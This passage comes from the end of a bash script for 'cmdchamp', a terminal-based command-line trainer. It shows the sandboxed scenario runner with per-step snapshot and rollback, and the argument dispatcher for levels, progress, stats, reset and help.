    return 1
  fi
  if ! ((SANDBOX_MODE)); then
    printf '%s\n' "${R}Scenarios require sandbox mode.${N}"; return 1
  fi
  _session_init
  _mode_init "sc${sc_id}"

  # Fresh sandbox + apply broken state
  _sandbox_reset
  "_sc_setup_${sc_id}" "$SANDBOX_DIR"

  # Load steps
  local -a steps=()
  while IFS= read -r line; do [[ -n "$line" ]] && steps+=("$line"); done <<< "$("_sc_steps_${sc_id}")"
  local total=${#steps[@]} correct=0

  # Splash screen
  printf '\e[2J\e[H'
  printf '%s\n' "${W}${B}═══ ${SC_NAMES[$sc_id]} ═══${N}"
  printf '%s\n' "${D}${SC_FLAVOR[$sc_id]}${N}"
  printf '%s\n\n' "${D}${total} steps — sandbox state persists between steps${N}"
  read -rsn1 -p "${D}Press Enter to start...${N}"; echo

  local si _sc_snap="$DATA/sandbox.snap"
  for ((si=0; si<total; si++)); do
    _qparse "${steps[$si]}"
    local prompt=$_qprompt ans=$_qans

    # Snapshot sandbox before each step so wrong answers can be rolled back
    rm -rf "$_sc_snap"; cp -a "$SANDBOX_DIR" "$_sc_snap"

    _REDRAW_HDR() {
      printf '\e[2J\e[H'
      printf '%s  %s\n' "${W}${B}${SC_NAMES[$sc_id]}${N}" "${D}[Step $((si+1))/${total}]${N}"
      printf '\n%s\n\n' "${C}${prompt}${N}"
    }
    _REDRAW_HDR
    HIST=()

    while true; do
      _read_line 1 1
      [[ -z "$input" ]] && { draw; continue; }
      if check "$input" "$_qanswers"; then
        [[ -n "$input" ]] && { HIST+=("$input"); HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
        ((++correct))
        ((_S_ANSWERED++)); ((_S_CORRECT++)); ((_S_STREAK++))
        ((_S_STREAK > _S_BEST_STREAK)) && _S_BEST_STREAK=$_S_STREAK
        _egg_check streak
        [[ -n "$_SANDBOX_OUTPUT" ]] && printf '\n%s\n' "${W}${_SANDBOX_OUTPUT}${N}"
        printf '\n%s\n' "${G}${B}+${N}"
        read -rsp "${D}Press Enter to continue...${N}"
        break
      else
        ((_S_ANSWERED++)); _S_STREAK=0; _wrong_show; _egg_check wrong "$input"
        explain "$ans"
        # Restore sandbox to pre-step state so retry starts clean
        chmod -R u+rwX "$SANDBOX_DIR" 2>/dev/null
        rm -rf "$SANDBOX_DIR"; cp -a "$_sc_snap" "$SANDBOX_DIR"
        read -rsp "${D}Press Enter to retry...${N}"
        _REDRAW_HDR
      fi
    done
  done
  rm -rf "$_sc_snap" 2>/dev/null

  # Completion
  printf '\e[2J\e[H'
  printf '%s\n' "${G}${B}═══ SCENARIO COMPLETE ═══${N}"
  printf '%s\n' "${C}${SC_NAMES[$sc_id]}${N}"
  printf '%s\n' "${G}${correct}/${total}${N} steps"
  _sc_mark_done "$sc_id"
  _egg_check completionist
  _sflush_if_dirty
  echo
}

# Handle --no-sandbox flag
[[ "${1:-}" == "--no-sandbox" ]] && { SANDBOX_MODE=0; shift; }

case "${1:-}" in
  [1-9]|[12][0-9]|30)
    _tty; _load_profile
    LVL=$1
    if ((LVL > 1 && LVL > BOSS_BEATEN + 1)); then
      printf '%s\n' "${R}Level $LVL locked${N} - beat Level $((LVL-1)) boss first"
      exit 1
    fi
    QI=0; save; _run_loop
    ;;
  p|progress)
    _load_profile
    printf '%s\n' "${B}Progress${N}"
    for lv in $(seq 1 $MAX_LEVEL); do
      if ((lv <= BOSS_BEATEN + 1)); then
        mark="${G}✓${N}"; ((lv > BOSS_BEATEN)) && mark="${Y}→${N}"
        printf "  %s ${W}%2d${N} %s\n" "$mark" "$lv" "${LEVEL_NAMES[$lv]:-}"
      else
        printf "  ${D}  %2d %s${N}\n" "$lv" "${LEVEL_NAMES[$lv]:-}"
      fi
    done
    ;;
  r|reset) rm -f "$DATA"/*.json "$DATA/scores" "$DATA/scores.lock" "$DATA/profile"; rm -rf "$DATA/sandbox" "$DATA/sandbox.pristine" 2>/dev/null; echo "Reset.";;
  c|cleanup) [[ -f "$DATA/scores" ]] && { flock -x "$DATA/scores.lock" awk -F'|' '/^#/{print;next} !seen[$1]++' "$DATA/scores" > "$DATA/scores.tmp" && mv "$DATA/scores.tmp" "$DATA/scores"; _cnt=$(wc -l < "$DATA/scores"); echo "Deduplicated scores."; ((_cnt > 5000)) && echo "Warning: scores file has $_cnt entries — consider resetting."; } || echo "No scores file.";;
  s|stats) _load_profile; stats;;
  review) _tty; _load_profile; review;;
  gauntlet) _tty; _load_profile; gauntlet;;
  timed) _tty; _load_profile; timed "${2:-120}";;
  scenario|sc) _tty; _load_profile; scenario "${2:-0}";;
  v|version|-v|--version) echo "cmdchamp $VERSION";;
  h|help|-h|--help)
    cat <<EOF
${B}cmdchamp${N} - CLI trainer
${D}30 levels, spaced repetition, sandbox execution${N}

Usage: cmdchamp [--no-sandbox] [level|command]

Options:
  --no-sandbox  Disable sandbox (text-match only)

Commands:
  1-30          Start level (must be unlocked)
  p|progress    Show level progress
  n|new         Start fresh from level 1
  s|stats       Show mastery statistics
  review        Practice weak levels (mastery < 80%)
  gauntlet      3 lives, escalating difficulty (post-ROOT)
  timed [secs]  Race the clock (post-ROOT, default 120s)
  scenario [N]  Sandbox investigations (unlock per-level, 1-8)
  r|reset       Reset all progress
  c|cleanup     Deduplicate score file
  h|help        Show this help

Controls:
  Tab      Show manpage for the command
  Ctrl+d   Quit (shows session summary)
  ?        Show vi keybindings (in vi mode)

EOF
    for lv in {1..30}; do printf "  %2d - %s\n" "$lv" "${LEVEL_NAMES[$lv]}"; done
    ;;
  n|new) _tty; _load_profile; LVL=1; QI=0; save; _run_loop;;
  "") _tty; _load_profile; load; ((LVL>1||QI>0)) && { read -rp "Continue Level $LVL Q$((QI+1))? [Y/n] " yn; [[ "$yn" =~ ^[Nn] ]] && { LVL=1; QI=0; save; _intro; _tutorial; }; }; _run_loop;;
  *) echo "Usage: cmdchamp [1-30|new|progress|stats|review|gauntlet|timed|scenario|reset|help]"; exit 1;;
esac
